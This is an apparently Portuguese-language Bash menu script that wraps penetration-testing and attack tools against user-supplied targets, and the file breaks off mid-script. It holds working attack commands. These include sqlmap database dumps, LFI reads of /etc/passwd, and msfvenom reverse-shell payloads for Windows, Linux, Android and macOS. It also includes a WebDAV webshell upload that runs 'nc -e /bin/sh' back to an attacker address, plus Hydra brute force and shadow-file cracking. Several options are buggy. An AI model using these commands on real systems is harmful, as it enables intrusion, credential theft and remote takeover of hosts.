#!/bin/bash
################################################################################
##Variaveis 
opnmap1="-sS -sV -sC -A -Pn"
portas="-p-"
#portaalvo=""
#ipalvo=""
opgobuster1="php,txt,html,sh,cgi,js,css,py,bak,pdf,doc,docx,xml"
arquivosbrute="/usr/share/wordlists/dirb/big.txt"
wordlista="/usr/share/wordlists/rockyou.txt"
token2=""
listadominios1="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
dirb="/home/bl4dsc4n/Downloads/dirsearch-master/dirsearch.py"
wordlistLFI2="/home/bl4dsc4n/Downloads/wordlist-lfi.txt"
loncrack1="/home/bl4dsc4n/Downloads/loncrack-master/wl.txt"
listaAlha="/usr/share/crunch/charset.lst"
communities1="/usr/share/cisco-torch/community.txt"
share="/home/bl4dsc4n/Downloads/dirsearch-master/shares.txt"

#datahoje=$(date '+%d/%m/%Y - %T')
#cidade="Belém-Pará"
#################################################################################

# Limpando a tela
clear

# Loop infinito
while :
do
    # Imprimindo as opções do menu
    echo
    echo "Inf Gathering # Enumeração # Scan # Exploração"
    echo -e "\e[36;1mDesenvolvido por: Pentest Jr # Carlos Tuma # Bl4dsc4n\e[0m" 
    echo -e "\e[31;1mLivre uso e modificação, mantenha o crédito em comentário\e[0m" "\e[32;1;5mSw1tchbl4d3 Ver 1.0.3a\e[0m"           
    echo "----------------------------------------------------------------------------------------------------"
    echo '| 1 - Scan Serviços & Vuln Nmap 11- Brute Force de SubDomain    21- Criando Reverse Shell MSFvenom  |'
    echo '| 2 - Scan Arquivos Gobuster    12- Baixar arquivos do ftp      22- Dirsearch                       |'
    echo '| 3 - Scan WordPress Wpscan     13- Transferencia de Zona       23- PortScan                        |'
    echo '| 4 - Scan SQLMAP               14- Onesixtyone                 24- Analisando Metodos HTTP         |'
    echo '| 5 - Pesquisa DNS              15- Enum4linux                  25- Modulo WEBDAV inj. shell.php    |'
    echo '| 6 - Scan joomla joomscan      16- Comandos do Sistema         26- Esteganografia                  |'
    echo '| 7 - Clonando Dominio          17- Exploração LFI linux        27- Brute Force                     |'
    echo '| 8 - Recon WhatWeb Tecnologias 18- Convertendo Bases           28- Infecção de Log SSH - LFI linux |'
    echo '| 9 - Identificar WAF           19- PingSweep Scan              29- Google Hack                     |'
    echo '| 10 - Sslscan                  20- Enumerando Arq. SMB netbios 30- Gerando Wordlista Personalizada |'
    echo '|                                                                                                   |'
    echo '| 0 - Sair                                                                                          |'
    echo "----------------------------------------------------------------------------------------------------"
    #echo "$cidade, $datahoje" 
    echo
    # '-p' Exibe a mensagem 'Opção:' '-n2' Lê dois caracteres e armazena em 'OPCAO'.

    read -n2 -p 'Opção: ' OPCAO 

    # Insere uma nova linha
    echo

    # Lê o número armazenado na variável 'OPCAO' e executa a opção correspondente.
    case $OPCAO in
########################################## Nmap #####################################################################
        1)  # Scan NMAP  
	    echo "1) Scan Discovery/Personalizado"
            echo "2) Enumerando NetBios Os-discovery"
            echo "3) Scan Scripts FTP"
            echo "4) Scan firewall/ids evasion"
	    echo "5) Scan Scripts RDP"
            echo "6) Enumerando shares NetBios"
            echo "7) Scan Mysql Vuln"
             

	    read -n1 -p 'Opção: ' resp
            echo
            
	    case $resp in            



	    "1") # Scan Discovery ou Personalizado	
			echo "Digite o IP alvo:"
            		read ip
	    		echo "Digite as Opcoes do Scan ou Enter (Ex: -sS -sV -sC -A --script=vuln -p-)"
            		read opnmap
            		if [ "$opnmap" == "" ]
	    		then
            	   		nmap $opnmap1  $ip > ScanPadrao.txt
		   		cat ScanPadrao.txt	
	    		else
                   		nmap $opnmap  $ip > ScanPerson.txt
                   		cat ScanPerson.txt
	    		fi
            ;;

	    "2")  # Scan NetBios - Enum - os-discovery 
            		echo "Digite a Rede:"
		        read rede
            		nmap -sS -p139,445 -Pn --open $rede -oG netbios.txt
            		cat netbios.txt | grep "Up" | cut -d " " -f 2 > targetsNetBios.txt
            		nmap --script smb-os-discovery -p 139,445 -iL targetsNetBios.txt
                        
            ;;

	    "3")  # Scan Scripts FTP
            		echo "Digite o IP alvo"
            		read rede  
            		nmap -sS -p21,2121 -Pn --open $rede -oG FTP.txt
            		cat FTP.txt | grep "Up" | cut -d " " -f 2 > targetsFTP.txt
            		nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p21,2121 -iL targetsFTP.txt
            ;;

	    "4")  # Scan firewall/ids evasion
            		echo "Digite o IP alvo"
            		read ip  
			echo "Digite a porta de bypass ex: 53"
			read portabypass
			echo "Digite a quantidade de Iscas  ex: 25"
			read iscas
			echo "Digite as Portas ex: -p- todas ou -p80,110,8080"
                        read portas
			nmap -sS -sV -sC -D $iscas -g $portabypass -T 4 --script=vuln $portas -Pn --open $ip -oG bypassfirewall.txt
                      
	     
            ;;

	    "5")  # Scan Scripts RDP
                        echo "Digite a Rede alvo:"
                        read rede
		        nmap -sS -p3389 -Pn --open $rede -oG RDP.txt
		        cat RDP.txt | grep "Up" | cut -d " " -f 2 > targetsrdp.txt
           		nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 -iL targetsrdp.txt

            ;;

	    "6")  # Scan NetBios - enum-shares 
            		echo "Digite a IP ou a Rede Alvo:"
		        read rede
                        nmap --script smb-enum-shares -p 139,445 $rede
            ;;

	    "7")  # Scan Mysql Vuln 
            		echo "Digite a IP ou a Rede Alvo:"
		        read rede
                        nmap -sV -p 3306 --script mysql-vuln-cve2012-2122,mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $rede

	    esac
	    ;;


############################################## gobuster #############################################################
        2)  # Gobuster 
            echo "1) DNS subdomain bruteforcing"
            echo "2) Directory/file brutceforcing"
          
            read -n1 -p 'Opção: ' resp0
            echo
            
	    case $resp0 in

	    "1") #
			echo "Digite o dominio alvo:"
			read dominio
			echo "Digite o caminho da wordlist ou Enter"
                        read wordlista6
                        if [ "$wordlista6" == "" ]
	    		then
            	   		gobuster dns -d $dominio -w $listadominios1 -q -i	
	    		else
                   		gobuster dns -d $dominio -w $wordlista6 -q -i
	    		fi
			

	    ;;

	    "2") #
			echo "Digite o IP/Dominio/Pasta alvo Ex: dominio/pasta"
			read dominio
			echo "Digite o caminho da wordlist ou Enter (Ex: /usr/share/wordlists/dirb/big.txt"
			read wordlista6
                        echo "Digite as Extensões ou Enter Ex: txt,php,jpg,pdf"
                        read  opgobuster
                        echo "Scaneando o Alvo..."
                        if [ "$wordlista6" == "" ]
	    		then
                                if [ "$opgobuster" == "" ]
	    		        then
            	   		gobuster dir -r -u $dominio -w $arquivosbrute -e -t 100 -x $opgobuster1 --no-error -b 403,404 -r -q
	                        else
                                       gobuster dir -r -u $dominio -w $arquivosbrute -e -t 100 -x $opgobuster --no-error -b 403,404 -r -q
                                fi
	    		else
                   		gobuster dir -r -u $dominio -w $wordlista6 -e -t 100 -x $opgobuster --no-error -b 403,404 -r -q
	    		fi

            esac
            ;;


############################################### Wpscan ##############################################################

        3)  # Wpscan 
            echo "1) Scan Plugins Vulneraveis"
	    echo "2) Scan Enumerando usuarios"
            echo "3) Scan disable-tls-checks"	
	    echo "4) Brute force em Senhas de Usuarios"
	    read -n1 -p 'Opção: ' resp00
            echo
	    case $resp00 in
	    
	    "1") # Scan Plugins Vulneraveis


            		echo "Digite o Dominio alvo:"
            		read ip
            		wpscan --url $ip --api-token $token2 --enumerate vp --plugins-detection aggressive
	    ;;

	    "2")  # Scan Enumerando usuarios
            		echo "Digite o Dominio alvo:"
            		read ip
            		wpscan --no-banner  --url $ip --api-token $token2 -e ap,u
            ;;
            "3") # Scan disable-tls-checks


            		echo "Digite o Dominio alvo:"
            		read ip
            		wpscan --disable-tls-checks --url $ip
	    ;;

	    "4")  # Brute force em Senhas de Usuarios
            		echo "Digite o Dominio alvo:"
            		read ip
			echo "Digite os usuarios ex: carlos,tuma,fabio"
                        read usuarios
                        echo "Digite a wordlist ou Enter"
			read wordlist
			if [ "$wordlist" == "" ]
	    		then
         	  		wpscan --no-banner --url $ip -U $usuarios -P $arquivosbrute            		  	
	    	        else
                                wpscan --no-banner --url $ip -U $usuarios -P $wordlist            		 
		        fi                      
           
	    esac
	    ;;

############################################## sqlmap ###############################################################
	4)  # sql DATABASE / sqlmap TABLES / sqlmap COLUNA / sqlmap DUMP 
            
	    echo "1) Scan Databases SQLMAP"
	    echo "2) Scan Tabelas SQLMAP"
            echo "3) Scan Colunas SQLMAP"	
	    echo "4) DUMP SQLMAP"
	    read -n1 -p 'Opção: ' resp1
            echo
	    case $resp1 in
	    
	    "1") # Scan Databases SQLMAP

		         echo "Digite a URL alvo SQLI:"
	                 read url
                         sqlmap -u $url --risk=3 --level=5 --random-agent --dbs
	    ;;

	    "2")  # Scan Tabelas SQLMAP
			 echo "Digite a URL alvo SQLI"
			 read url
            		 echo "Digite o nome da database:"
            		 read database1
                         sqlmap -u $url --risk=3 --level=5 --random-agent -D $database1 --tables
            ;;

	    "3")  # Scan Colunas SQLMAP
           
			 echo "Digite a URL alvo SQLI:"
       			 read url
                         echo "Digite database:"
                         read database1
                         echo "Digite a tabela:"
                         read tabela
                         sqlmap -u $url --risk=3 --level=5 --random-agent -D $database1 -T $tabela --columns
            ;;

	    "4")  # DUMP SQLMAP
                         echo "Digite a URL alvo SQLI:"
                         read url
	                 echo "Digite database:"
                         read database1
                         echo "Digite a tabela:"
                         read tabela
                         echo "Digite a coluna:"
                         read coluna
                         sqlmap -u $url --risk=3 --level=5 --random-agent -D $database1 -T $tabela -C $coluna --dump
       
	    esac
	    ;;

################################################### Pesquisa DNS ##################################################
        5)  # Pesquisa DNS 
            
	    echo "1) Localizando IP do dominio IPV4"
	    echo "2) Localizando Servidor Email"
            echo "3) Localizando Servidores DNS"	
	    echo "4) HINFO"
	    echo "5) Localizando IPV6 do dominio"
            echo "6) Localizando TXT info"

            read -n1 -p 'Opção: ' resp2
            echo
	    case $resp2 in
	    
	    "1") # Localizando IP do dominio IPV4
            		 echo "Digite o domino:"
            		 read dominio
		         host -t A $dominio
            ;;

	    "2")  # Localizando Servidor Email
            		 echo "Digite o dominio:"
            		 read dominio
			 host -t mx $dominio
            ;;
	    "3")  # Localizando Servidores DNS
            		 echo "Digite o dominio:"
            		 read dominio
			 host -t ns $dominio
            		 
            ;;
            "4")  # HINFO
            		 echo "Digite o dominio:"
            		 read dominio
			 host -t hinfo $dominio
            ;;
	    "5")  # Localizando IPV6 do dominio
            		 echo "Digite o dominio:"
            		 read dominio
			 host -t aaaa $dominio
            ;;
	    "6")  # Localizando TXT info
            		 echo "Digite o dominio:"
            		 read dominio
			 host -t txt $dominio
      
	    esac
	    ;;

################################################### joomscan ######################################################
	6)  # joomscan 
            echo "Digite o Dominio alvo:"
            read ip
            joomscan -ec -r -u $ip
	    ;;

#################################################### clonando dominio ##############################################
	7)  # Clonando dominio 
            echo "Digite o dominio alvo:"
            read dominio
            wget -m $dominio
	    ;;

#################################################### Recon WhatWeb ################################################
	8)  # Recon WhatWeb 
            echo "Digite o dominio alvo:"
            read dominio1
            whatweb $dominio1
	    ;;

################################################### Wafw00f #########################################################
        9)  # Identificar WAF  
            echo "Digite o Domino"
            read dominio
            wafw00f $dominio
            ;;
################################################### sslscan #########################################################
       10)  # Sslscan 
            echo "Digite o dominio Alvo"
            read alvo
            sslscan $alvo
            ;;

##########################################  Brute Force de SubDomain ################################################	
       11)  # Brute Force de SubDomain 
            echo "Digite o Dominio:"
            read dominio2
            for subdominios1 in $(cat $listadominios1);do host $subdominios1.$dominio2 | grep "has address";done   
            ;;

############################################## FTP ################################################################
       12)  # Baixando arquivos do ftp 
            echo "Digite o IP do alvo"
            read ip
            echo "Digite o usuario"
            read user
            echo "Digite a senha"
            read senha
	    wget -m --no-passive ftp://"$user":"$senha"@$ip
            ;;

###################################################################################################################
       13) # Transferencia de Zona 
            echo "Digite o dominio"
            read dominio
            echo "_________________________________"
            for dns in $(host -t ns $dominio | cut -d " " -f 4);do host -l $dominio $dns;done
	    ;;

############################################# onesixtyone #########################################################            
       14) # Onesixtyone 
            echo "Digite o IP alvo"
            read ip
            echo "Digite o Caminho da lista de communities ou Enter"
            read communities
            if [ "$communities" == "" ]
	    then
         	  onesixtyone -c $communities1 $ip 	
	    else
                  onesixtyone -c $communities $ip 
            fi
            ;;

############################################# enum4linux ###########################################################
       15)  # enum4linux 
            echo "Digite o IP alvo:"
            read ip
            enum4linux -a $ip
            ;;

############################################# Comandos do Sistema ###################################################
       16)  # Comandos do sistema 
            echo "Digite o Comando do Sistema"
	    read comando
            $comando
	    ;;

##################################################  LFI linux  ######################################################	
       17)  # Exploração LFI linux 
            echo "Digite o local com LFI ex: domino/arquivo.php?="
            read local2
            echo "Digite o arquivo ex: etc/passwd"
            read arquivo
            echo "Digite o payload ou Enter ex: ../../../../"
            read
            if [ "$payload" == "" ]
	    then
                  curl -s $local2../../../../../../../$arquivo | grep -v "<"
	    else
                  
                  curl -s "$local2""$payload""$arquivo" | grep -v "<"  
            fi
            ;;

############################################ nbtscan ################################################################
        18)  # Convertendo Base64| md5sum | sha256sum | sha512sun 
            
	    echo "1) Convertendo Arquivo.txt em Base64"
	    echo "2) Convertendo Texto em Md5"
            echo "3) Convertendo Texto em sha256"	
	    echo "4) Convertendo Texto em sha512"
	    echo "5) Decode de arquivo em base64"
            echo "6) Converter Hex para Caractere"
            echo "7) Converter Decimal"
            echo "8) Base64 Decode de texto"
            echo "9) Converter texto em base64"

            read -n1 -p 'Opção: ' resp3
            echo
	    case $resp3 in
	    
	    "1") # 
            		 echo "Digite o caminho do arquivo ex: /home/arq.txt"
            		 read arquivo
		         cat $arquivo | base64 
            ;;

	    "2")  # 
            		 echo "Digite o Texto"
            		 read texto
			 echo -n "$texto" | md5sum
            ;;
	    "3")  # 
            		 echo "Digite o Texto"
            		 read texto
			 echo -n "$texto" | sha256sum
            		 
            ;;
            "4")  # 
            		 echo "Digite o Texto"
            		 read texto
			 echo -n "$texto" | sha512sum
            ;;
	    "5")  # 
            		 echo "Digite o Caminho do Arquivo para Decode"
            		 read arquivo
			 base64 -d $arquivo
            ;;
	    "6")  # 
            		 echo "Digite o caractera o Hex para conveter:"
            		 read Hex
			 echo -e "\x"$Hex

            ;;
	    "7")  # 
            		 echo "Digite o caractera o Decimal para conveter:"
            		 read Decimal
			 printf "%x\n" $Decimal
			 
	    ;;
	    "7")  # 
            		 echo "Digite o texto codificado para decode:"
            		 read texto
			 echo "$texto" | base64 -d
            ;;
	    "8")  # 
            		 echo "Digite o texto para converter:"
            		 read texto
			 echo "$texto" | base64			              
	    esac
	    ;;


############################################ PingSweep ScanRede ################################################################
        19)  # PingSweep Scan /24

            echo "Digite o IP da rede Ex: 192.168.1.0"
            read ipI
            echo $ipI > ipI.txt
            echo "Digite o intervalo Ex: 1 254"
            read intervalo
            testa=$(awk -F. '{print $1"."$2"."$3}' ipI.txt)
            for i in $(seq $intervalo);do ping -c1 -w1 $testa.$i;done | grep "64 bytes"
            ;;

############################################ smbclient ##############################################################
        20)  # Enumerando Arquivos SMB netbios 
            
	    echo "1) Enumerando compar. - null session - smbclient"
	    echo "2) Brute de compartilhamentos - null session"
            echo "3) Scan NetBios - nbtscan"	
		
            read -n1 -p 'Opção: ' resp3
            echo
	    case $resp3 in
	    
	    "1") # Enumerando compartilhamentos Host - null session
            		 echo "Digite o IP alvo:"
                         read ip
                         smbclient -L //$ip/ -N  
                       
            ;;

            "2") # Brute de compartilhamentos Host - null session
            		echo "Digite o IP alvo:"
            		read ip
            		for shares in $(cat $share); do
            		saida=$(smbclient -U '%' -N \\\\$ip\\$shares -c '')
            		if [[ -z $saida ]]; then
                 	echo "É possivel null session em $shares"
           		else
                 		echo $saida > /dev/null
            		fi
            		done 
            ;;

            "3") # Scan NetBios 
            		echo "Digite a Rede:"
            		read rede
	    		nbtscan $rede
  
            esac
            ;;


############################################# MsfVenom #############################################################
        21)  # Criando Reverse Shell MSFvenom 
            echo "1) Meterpreter Reverse TCP Shell - Windows x86"
            echo "2) Reverse HTTPS Shell - Windows"
            echo "3) Encoded Meterpreter Reverse HTTPS Shell - Windows"
            echo "4) Meterpreter Reverse TCP Shell - Linux"
            echo "5) Bind TCP Shell - Linux"
            echo "6) Web Reverse Shell ASP"
            echo "7) Web Reverse Shell PHP"
            echo "8) Web Reverse Shell JSP"
            echo "9) Web Reverse Shell WAR"
            echo "10) Script Reverse Shell Python"
            echo "11) Script Reverse Shell Bash"
            echo "12) Script Reverse Shell Perl"
            echo "13) Reverse HTTP Apk"
            echo "14) Reverse HTTPs Apk"
            echo "15) Reverse TCP Apk"
            echo "16) Reverse TCP macOS x86"
	    read -n2 -p 'Opção: ' resp4
            echo
            
	    case $resp4 in
	    "1") ## Reverse Tcp x86
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                  	msfvenom  -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f exe > shellTCP.exe		 
	    ;;
	    "2") ## Reverse Https
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$porta -f exe > shellHTTPS.exe
            ;;
            "3") # Reverse Encoder
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
	                msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$porta -e x86/shikata_ga_nai -i 20 -f exe > shell.exe
	    ;;
	    "4") # Reverse tcp x86 x64
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        echo "Digite a arquitetura x86 ou x64"
                        read arquitetura
                        msfvenom -p linux/$arquitetura/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f elf > reverseTCP.elf
            ;; 
            "5") #bind x86 x64
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        echo "Digite a arquitetura x86 ou x64"
                        read arquitetura
                        msfvenom -p linux/$arquitetura/meterpreter/bind_tcp RHOST=$ip LPORT=$porta -f elf > bindTCP.elfv

	    ;; 
            "6") # Reverse Asp
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f asp > shell.asp
 	    ;; 
            "7") # Reverse PHP
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f raw -o shell.php
            ;; 
            "8") # Reverse Jsp
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$porta -f raw > shell.jsp	    
            ;;  
            "9") # Reverse War
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$porta -f war > shell.war
            ;; 
            "10") # Reverse Python
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$porta -f raw > shell.py
            ;; 
            "11") # Reverse Bash
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$porta -f raw > shell.sh
            ;; 
            "12") # Reverse Perl
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$porta -f raw > shell.pl
            ;; 
            "13") # Reverse HTTP Apk
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$porta R > shellHTTP.apk
            ;; 
            "14") # Reverse HTTPs Apk
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$porta R > shellHTTPs.apk
            ;; 
            "15") # Reverse TCP Apk
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta R > shellTCP.apk

            ;; 
            "16") # Reverse TCP macOS x86
			echo "Digite o IP Reverso"
			read ip
			echo "Digite a Porta Reversa"
                        read porta
                        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$porta -f macho > shell.macho
            
            esac
            ;;

############################################## dirsearch ###########################################################
         22)  # dirsearch 
            echo "1) Procura normal"
            echo "2) Procura Recursiva"
            read -n2 -p 'Opção: ' resp8
            echo
            
	    case $resp8 in

	    "1") ## Procura normal
                       echo "Digite o Dominio/pasta alvo:"
                       read ip
                       echo "Digite status para excluir Ex: 403,500"
            	       read status
                       echo "Digite Tipos de as extensão (php,txt,cgi)"
                       read opgobuster
                       echo "Digite o caminho da wordlist ou Enter"
                       read wordlista3
                       if [ "$opgobuster" == "" ]
  	               then
  	                     if [ "$wordlista3" == "" ]
  	                     then
  	                           if [ "$status" == "" ]
  	                           then
		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $arquivosbrute 
		                   else
		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $arquivosbrute -x $status
		                   fi
		             else
		                   if [ "$status" == "" ]
  	                           then
                                         python3 $dirb -f -e $opgobuster1 -u $ip -w $wordlista3 
		                   else
     		                         python3 $dirb -f -e $opgobuster1 -u $ip -w $wordlista3  -x $status     
		                   fi
		                        
		             fi      
	               else
                             if [ "$wordlista3" == "" ]
  	                     then
  	                           if [ "$status" == "" ]
  	                           then
		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute  
		                   else
		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute -x $status
		                   fi
		             else
		                   if [ "$status" == "" ]
  	                           then
		                        python3 $dirb -f -e $opgobuster -u $ip -w $arquivosbrute  
		                   else
		                        python3 $dirb -f -e $opgobuster -u $ip -w $wordlista3 -x $status
		                   fi     
		             fi    
                       fi
                        
                      
            ;;
  
            "2") ## Procura Recursiva
                       echo "Digite o IP/pasta ou Dominio/pasta alvo:"
                       read ip
                       echo "Digite os status para excluir Ex: 403,500"
            	       read status
                       echo "Digite os Tipos de as extensão (php,txt,cgi)"
                       read opgobuster
                       echo "Digite o caminho da wordlist ou Enter"
                       read wordlista3
                       if [ "$opgobuster" == "" ]
  	               then
  	                     if [ "$wordlista3" == "" ]
  	                     then
  	                           if [ "$status" == "" ]
  	                           then
		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster1 
		                   else
		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster1 -x $status
		                   fi
		             else
		                   if [ "$status" == "" ]
  	                           then
  	                                python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster1 
  	                           else
		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster1 -x $status
		                   fi     
		             fi      
	               else
                             if [ "$wordlista3" == "" ]
  	                     then
  	                           if [ "$status" == "" ]
  	                           then
		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster 
		                   else
		                        python3 $dirb -r -u $ip -w $arquivosbrute -f -e $opgobuster -x $status
		                   fi     
		             else
		                   if [ "$status" == "" ]
  	                           then
		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster 
		                   else
		                        python3 $dirb -r -u $ip -w $wordlista3 -f -e $opgobuster -x $status
		                   fi     
		             fi    
                       fi 
            esac	    
            ;; 

##############################################################################################################
	 23)  # PortScan
            echo "Digite o IP"
            read ip
            echo "Digite o Intervalo de porta Ex: 1 65535"
            read int
            for port in $(seq $int);do
            2>/dev/null echo > /dev/tcp/$ip/$port
            if [ $? == 0 ]
            then
                echo "Open:$port"
            fi
            done 
            ;;

########################################## Metodos HTTP curl ######################################################
	24)  # Analisando Metodos HTTP 
            echo "Digite o IP or Dom/Pasta ex: 192.168.1.1/pasta"
            read ip
            echo "Digite o Metodo HTTP ex: OPTIONS"
            read metodo
            curl -X $metodo http://$ip 	
            ;;

######################################### WEBDAV ##################################################################
	25)  # Injetando webshell.php WEBDAV 
            echo "1) Executar comandos do sistema webshell.php WEBDAV"
	    echo "2) Shell Reverse com nc"
	    echo "3) Teste automatizado Davtest"
	    echo "4) Conectar webdav - cadaver"
          	  
            read -n1 -p 'Opção: ' resp5
            echo
	    case $resp5 in
	    
	    "1") # Executar comandos sistema - Injetando webshell.php WEBDAV  
            		 
                      echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
                      read ip
                      echo "Digite o Comando (ex: id)"
             	      read comando
		      echo
                      curl -X PUT -d "<?php system('$comando');?>" $ip/webshell.php
                      curl -s -X GET $ip/webshell.php | egrep -v "<"
            ;;

            "2") # Injetando webshell.php WEBDAV  
            	      echo "Lembre-se de ouvir a porta Reversa"
                      echo
                      echo "Digite o IP or Dom/Pasta Alvo Ex: 192.168.1.5/dav"
                      read ip
                      echo "Digite o IP reverso"
                      read ipreverso
                      echo "Digite a Porta Reversa"
                      read porta
                      echo
                      curl -s -X PUT -d "<?php system('nc -e /bin/sh $ipreverso $porta');?>" http://$ip/webshell.php
                      curl -s -X GET http://$ip/webshell.php
                       
            ;;
            
            "3") # Testar WebDav - davtest  
            		 
                      echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
                      read ip
                      davtest --url http://$ip/
            ;;         
                     
            "4") # Conectar no WEBDAV - Cadaver  
            		 
                      echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
                      read ip
                      cadaver http://$ip/
              
                     
                            
            esac
	    ;;

#####################################################################################################################
        26) # Esteganografia 
            echo "1) Esconder Arquivo em Foto .jpg"
	    echo "2) Extrair Arquivo de Foto .jpg"
            echo "3) Instalar o Steghide"
            read -n1 -p 'Opção: ' resp6
            echo
	    case $resp6 in
	    
	    "1") # Esconder Arquivo em Foto .jpg  
           	     echo "Digite o caminho do .jpg ex: /home/foto.jpg"
                     read jpg
		     echo "Digite o caminho do arquivo a esconder ex: /home/arq.sh"
                     read arquivo
	             echo "Digite o nome do arquivo final ex: arquivo"
                     read nomearquivo
                     steghide embed -cf $jpg  -ef $arquivo -sf $nomearquivo.jpg
                                       
            ;;

            "2") # Extrair Arquivo de Foto .jpg 
            	     echo "Digite o caminho do .jpg ex: /home/foto.jpg"
                     read jpgext
                     steghide extract -sf $jpgext
            ;;

            "3") # Instalar o Steghide 
            	     apt update
                     apt install steghide -y
            esac
	    ;;

###################################################################################################################
       27) # Brute Force 
            echo "1) Brute de Hash por Formato"
	    echo "2) Brute SSH Hydra"
            echo "3) Brute Hash - hashCat"
	    echo "4) Brute Hydra Protocolos"
            echo "5) Brute de Hash Linux etc/shadow"
	    echo "6) Brute id_rsa SSH"
	    echo "7) Brute de Hash Linux"
          
            read -n1 -p 'Opção: ' resp6
            echo
	    case $resp6 in
	    
	    "1") # Brute de Hash por Formato
            	    echo "Digite o Caminho do arquivo Hash ex: /home/hash.txt"
                    read Hash
		    echo "Digite o Formato do Hash"
                    read formato
	            echo "Digite o caminho da wordlist ou Enter"
                    read wordlista2
                    if [ "$wordlista2" == "" ]
	            then
		         john --format=$formato --wordlist=$wordlista $hash
		         john $hash --show
	            else
		         john --format=$formato --wordlist=$wordlista2 $hash
		         john $hash --show
                    fi
           ;;

           "2") # Brute SSH Hydra  
                    echo "Digite o IP alvo"
                    read ip
                    echo "Digite l=usuario ou L=lista ex: L"
                    read lista
                    echo "Digite o usuario ou caminho Lista"
                    read usuario
                    echo "Digite p=senha ou P=listaSenha Ex: P"
                    read listasenha
		    
                    if [ "listasenha" == "P" ]
	            then
                          echo "Digite o caminho da wordlista"
                          read wordlista5
			  hydra -$lista $usuario -$listasenha $wordlista5 ssh://$ip
	            else
		          echo "Digite a Senha"
			  read senha
		          hydra -$lista $usuario -$listasenha $senha ssh://$ip
                    fi
           ;;

           "3") # Brute Hash - hashCat
                    echo "Digite o caminho do arquivo hash"
                    read hash1
                    echo "Digite o numero do formato do Hash ex: 100"
                    read numero
                    echo "Digite o caminho da wordlist ou Enter"
                    read wordlist6
                    if [ "wordlist6" == "" ]
                    then
                          hashcat -m $numero $hash1 $wordlista
                    else
                          hashcat -m $numero $hash1 $wordlista6
                    fi 
           ;;

          
           "4") #  Brute Hydra Protocolos 
                    echo "Digite o Usuario ou caminho da Lista"
                    read usuario
                    echo "Digite l=usuario L=lista ex: L"
                    read lista
                    echo "Digite p=senha ou P=listasenha ex: P"
                    read senhas
	            echo "Digite a senha ou caminho da wordlist ou Enter"
                    read listasenhas
                    echo "Digite o IP Alvo"
                    read ip
                    echo "Digite o Protocolo ex: smb"
                    read protocolo
                    echo "Digite a porta"
                    read porta
                    if [ "$listasenhas" == "" ]
	  	    then
         	          hydra -v -$lista $usuario -$senhas $wordlista $ip $protocolo -s $porta   	 	
	    	    else
                          hydra -v -$lista $usuario -$senhas $listasenhas $ip $protocolo -s $porta
            	    fi                         

           ;;
 
           "5") # Brute de Hash Linux etc/shadow  
            	    echo "Digite o caminho do Passwd"
                    read passwd2
                    echo "Digite o caminho do Shadow"
                    read shadow2
                    echo "Digite o Caminho da Wordlist ou Enter"
                    read wordlista5 
                    unshadow $passwd2 $shadow2 > hashlinux.txt
                    if [ "$wordlista5" == "" ]
	  	    then
         	          john hashlinux.txt --wordlist=$wordlista
                          john hashlinux.txt --show   	 	
	    	    else
